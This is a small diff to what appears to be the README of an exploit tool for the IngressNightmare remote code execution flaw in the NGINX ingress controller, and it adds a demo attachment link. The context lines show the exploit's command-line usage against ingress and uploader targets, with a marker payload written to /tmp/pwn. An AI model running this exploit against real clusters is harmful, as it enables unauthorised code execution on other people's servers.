@@ -29,6 +29,6 @@ triggered remote code execution in the context of the NGINX server.
 ./ingressnightmare -m c  -c 'date >> /tmp/pwn; echo eson pwn >> /tmp/pwn' -i ${INGRESS} -u ${UPLOADER} 
 ```
 
-
+https://github.com/user-attachments/assets/415d6b81-b907-4aaa-bd99-18640bd64b2b
 
 
